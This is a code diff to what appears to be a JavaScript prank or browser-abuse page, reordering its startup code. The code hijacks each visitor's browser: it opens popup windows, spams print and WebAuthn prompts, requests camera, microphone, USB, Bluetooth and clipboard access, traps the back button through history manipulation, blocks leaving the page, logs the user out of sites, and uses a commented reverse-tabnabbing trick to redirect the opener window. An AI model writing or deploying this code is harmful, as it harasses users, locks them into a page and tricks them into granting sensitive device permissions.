@@ -81,6 +81,115 @@ const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden
 
 const wins = []
 
+const isChildWindow = (window.opener && isParentSameOrigin()) || window.location.search.indexOf('child=true') !== -1
+console.log(window.opener)
+console.log(isParentSameOrigin())
+initialize()
+
+if (isChildWindow) {
+    initializeChild()
+} else {
+    initializeMain()
+}
+
+function initialize() {
+    window.addEventListener("beforeunload", event => {
+        event.returnValue = true
+    })
+
+    interceptUserInput(event => {
+        interactions += 1
+
+        event.preventDefault()
+        event.stopPropagation()
+
+        if (event.which !== 0) openWindow()
+
+        startVibrate()
+
+        wins.forEach(win => {
+            if (!win.closed) win.focus()
+        })
+
+        copyToClipboard(getRandomArrayEntry(nathatpastelsearchhistory))
+
+        if (event.key === "Meta" || event.key === "Control") {
+            window.print()
+            requestWebauthnAttestation()
+            window.print()
+            requestWebauthnAttestation()
+            window.print()
+            requestWebauthnAttestation()
+            window.print()
+            requestWebauthnAttestation()
+            window.print()
+            requestWebauthnAttestation()
+            window.print()
+            requestWebauthnAttestation()
+            window.print()
+            requestWebauthnAttestation()
+            window.print()
+            requestWebauthnAttestation()
+            window.print()
+            requestWebauthnAttestation()
+            window.print()
+            requestWebauthnAttestation()
+        }
+        requestFullscreen()
+        requestPointerLock()
+        requestClipboardRead()
+        requestMidiAccess()
+        requestBluetoothAccess()
+        requestUSBAccess()
+        requestSerialAccess()
+        requestHIDAccess()
+        requestCameraAndMicAccess()
+        if (Math.random() < 0.1) requestWebauthnAttestation()
+    })
+}
+
+function initializeMain() {
+    const template = document.querySelector("template")
+    const clone = document.importNode(template.content, true)
+    document.body.appendChild(clone)
+
+    window.addEventListener("popstate", () => {
+        window.history.forward()
+    })
+
+    for (let i = 1; i < 20; i++) {
+        window.history.pushState({}, '', window.location.pathname + "?trolled=" + i)
+    }
+    window.history.pushState({}, window.location.pathname)
+
+    createAudio()
+
+    interceptUserInput(event => {
+        if (interactions === 1) {
+            document.querySelector("audio").play()
+
+            registerProtocolHandlers()
+
+            // cool targetblank vuln that i think is very cool
+            if (!isChildWindow && window.opener && !isParentSameOrigin()) {
+                window.opener.location = `${window.location.origin}/?child=true`
+            }
+
+            document.querySelector(".click-anywhere").remove()
+
+            document.querySelector("html").style = "cursor: none;"
+
+            audio.play()
+
+            logout()
+        }
+    })
+}
+
+function initializeChild() {
+
+}
+
 let interactions = 0
 let iFrameNum = 0
 
@@ -479,113 +588,4 @@ function createAudio() {
 
     document.body.appendChild(audio)
     audio.appendChild(source)
-}
-
-const isChildWindow = (window.opener && isParentSameOrigin()) ||
-    window.location.search.indexOf('child=true') !== -1
-
-function initialize() {
-    window.addEventListener("beforeunload", event => {
-        event.returnValue = true
-    })
-
-    interceptUserInput(event => {
-        interactions += 1
-
-        event.preventDefault()
-        event.stopPropagation()
-
-        if (event.which !== 0) openWindow()
-
-        startVibrate()
-
-        wins.forEach(win => {
-            if (!win.closed) win.focus()
-        })
-
-        copyToClipboard(getRandomArrayEntry(nathatpastelsearchhistory))
-
-        if (event.key === "Meta" || event.key === "Control") {
-            window.print()
-            requestWebauthnAttestation()
-            window.print()
-            requestWebauthnAttestation()
-            window.print()
-            requestWebauthnAttestation()
-            window.print()
-            requestWebauthnAttestation()
-            window.print()
-            requestWebauthnAttestation()
-            window.print()
-            requestWebauthnAttestation()
-            window.print()
-            requestWebauthnAttestation()
-            window.print()
-            requestWebauthnAttestation()
-            window.print()
-            requestWebauthnAttestation()
-            window.print()
-            requestWebauthnAttestation()
-        }
-        requestPointerLock()
-        requestFullscreen()
-        requestClipboardRead()
-        requestMidiAccess()
-        requestBluetoothAccess()
-        requestUSBAccess()
-        requestSerialAccess()
-        requestHIDAccess()
-        requestCameraAndMicAccess()
-        if (Math.random() < 0.1) requestWebauthnAttestation()
-    })
-}
-
-function initializeMain() {
-    const template = document.querySelector("template")
-    const clone = document.importNode(template.content, true)
-    document.body.appendChild(clone)
-
-    window.addEventListener("popstate", () => {
-        window.history.forward()
-    })
-
-    for (let i = 1; i < 20; i++) {
-        window.history.pushState({}, '', window.location.pathname + "?trolled=" + i)
-    }
-    window.history.pushState({}, window.location.pathname)
-
-    createAudio()
-
-    interceptUserInput(event => {
-        if (interactions === 1) {
-            document.querySelector("audio").play()
-
-            registerProtocolHandlers()
-
-            // cool targetblank vuln that i think is very cool
-            if (!isChildWindow && window.opener && !isParentSameOrigin()) {
-                window.opener.location = `${window.location.origin}/?child=true`
-            }
-
-            document.querySelector(".click-anywhere").remove()
-
-            document.querySelector("html").style = "cursor: none;"
-
-            audio.play()
-
-            logout()
-        }
-    })
-}
-
-function initializeChild() {
-
-}
-
-initialize()
-
-if (isChildWindow) {
-    initializeChild()
-} else {
-    initializeMain()
 }
